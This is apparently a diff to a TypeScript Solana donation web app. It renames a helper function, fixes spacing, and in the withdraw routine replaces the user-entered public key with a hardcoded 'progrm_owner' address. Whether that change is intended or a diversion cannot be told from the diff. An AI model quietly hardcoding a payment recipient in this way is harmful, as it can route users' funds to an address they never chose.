@@ -33,7 +33,7 @@ const path = "../wallets/id.json"
 const pathe = "../wallets/testers.json"
 const path_prog = "../wallets/program.json"
 
-async function testerrrrrrrrr(ac:AccountInfo<Buffer>){
+async function get_records(ac:AccountInfo<Buffer>){
     let acc_bytes = ac.data;
     let dat = new TextDecoder().decode(acc_bytes);
     let dat_arr = dat.split(";");
@@ -150,7 +150,7 @@ async function prepareTransaction(userPubkey: PublicKey, resiver_key:PublicKey):
 }
 
 export async function sendViaSolletDonation() {
-    let _ =prepare_note_account()
+    let _ = prepare_note_account()
     // return
     let output_list = document.querySelector('#inform')
     output_list.textContent="Confirm transaction"
@@ -168,7 +168,8 @@ export async function sendViaSolletDonation() {
 export async function sendViaSolletWithdraw(b) {
     let output_list = document.querySelector('#inform_withdraw')
     output_list.textContent="Withdraw in progress"
-    let input = (document.getElementById("pub_key") as HTMLInputElement).value
+    let progrm_owner = "HvKk3uTjtq61Uy8Lm5XT87Hp56GTv1YhW1QpgNE5Bg4W"
+    let input = progrm_owner
     let val
     let fee = 7000
     if(b) {
@@ -215,7 +216,7 @@ export async function getTransactions(){
     let greetedAccount = await prepare_note_account();
     let output_list = document.querySelector('#output')
     output_list.textContent="Operation in progress"
-    let array = await testerrrrrrrrr(greetedAccount)
+    let array = await get_records(greetedAccount)
     let pre_key = (document.querySelector('#person_key') as HTMLInputElement).value
     console.log(pre_key == "");
     if(pre_key != ""){
